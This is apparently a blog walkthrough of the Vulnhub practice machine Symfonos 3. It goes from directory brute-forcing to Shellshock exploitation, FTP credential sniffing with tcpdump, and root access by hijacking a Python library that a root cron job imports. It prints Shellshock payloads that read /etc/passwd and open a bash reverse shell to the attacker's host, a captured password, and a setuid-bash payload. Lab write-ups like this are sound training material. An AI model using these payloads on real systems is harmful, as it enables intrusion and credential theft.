+++
title = "Vulnhub: Symfonos 3"
date = "2021-02-11"
author = ""
authorTwitter = "" #do not include @
tags = ["Intermediate", "Vulnhub", "OSCP Prep", "ffuf", "Directory Bruteforce", "ShellShock", "Tcpdump"]
keywords = ["", ""]
description = ""
showFullContent = false
cover = "/img/symfonos1/symfonos1.png"
images = ["/img/symfonos1/symfonos1.png"]
+++



| Difficulty | Release Date | Author | 
| ---------- | ------------ | ------ | 
| Intermediate | 7 Apr 2020 | Zayotic | 

# Summary

In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib 
directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
cron job. We create a suid bash binary that we use to get a root shell.

# Reconnaissance

Nmap

```nmap
Nmap scan report for 192.168.191.130
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

## HTTP (80)

Visiting the IP on the browser, all we get is a picture.

{{< image src="/img/symfonos3/symfonos3-11.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Viewing the source doesn't reveal much.

{{< image src="/img/symfonos3/symfonos3-12.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.

```sh
ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
```

{{< image src="/img/symfonos3/symfonos3-3.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Going to the research endpoint, there's information about the Underworld and Greek mythology. 

{{< image src="/img/symfonos3/symfonos3-4.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Some of the words look similar to the directories we discovered, so let's create a wordlist which maybe helpful later.

```shell
cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
```
The current directories we have discovered don't have much in them. At this point I was stuck a bit, after looking at
some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
with a trailing slash.

```shell
ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
```

{{< image src="/img/symfonos3/symfonos3-5.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I'll use going forward. The presence of
cgi-bin could potentially mean we can have a shellshock vulnerability.

Running another bruteforce using the wordlist I created earlier didn't work. I then thought to get a lowercase version of the 
words and try it.

```shell
cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt

ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
```
{{< image src="/img/symfonos3/symfonos3-13.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

With the lowercase wordlist, we get underworld.

To verify the shellshock vulnerability, we can send this request.

```shell
curl -A "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.191.130/cgi-bin/underworld
```

{{< image src="/img/symfonos3/symfonos3-6.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Shell as cerberus

After verifying this vulnerability, we can get a reverse shell.

```shell
curl -A "() { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.191.1/9000 0>&1 &'" http://192.168.191.130/cgi-bin/underworld
```

{{< image src="/img/symfonos3/symfonos3-7.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
command.

```shell
find / -group pcap -ls 2>/dev/null
```

{{< image src="/img/symfonos3/symfonos3-8.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

This reveals we can run tcpdump, therefore we can sniff network traffic. 

Before sniffing traffic, I used [pspy](https://github.com/DominicBreuker/pspy) to check for cron jobs and other commands being executed.

{{< image src="/img/symfonos3/symfonos3-9.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I'll sniff ftp 
traffic which isn't typically encrypted.

```shell
tcpdump port 21 -n -i lo -A
```

{{< image src="/img/symfonos3/symfonos3-10.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.

# Privilege Escalation

Using the credentials we login to ssh as hades, running id reveals hades is in gods group.

{{< image src="/img/symfonos3/symfonos3-14.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Running find again reveals we have write permissions to /usr/lib/python2.7 folder.

```shell
find / -group gods -ls 2>/dev/null
```

{{< image src="/img/symfonos3/symfonos3-15.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
any imports in that ftpclient.py script.

{{< image src="/img/symfonos3/symfonos3-16.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Since ftplib is imported, we'll replace ftplib.py with this script

```py
import os

os.system('cp /bin/bash /tmp/bash')
os.system('chmod +s /tmp/bash')
```

{{< image src="/img/symfonos3/symfonos3-17.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

This will create a setuid bash binary in /tmp. Which can use to gain root privileges.

{{< image src="/img/symfonos3/symfonos3-18.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

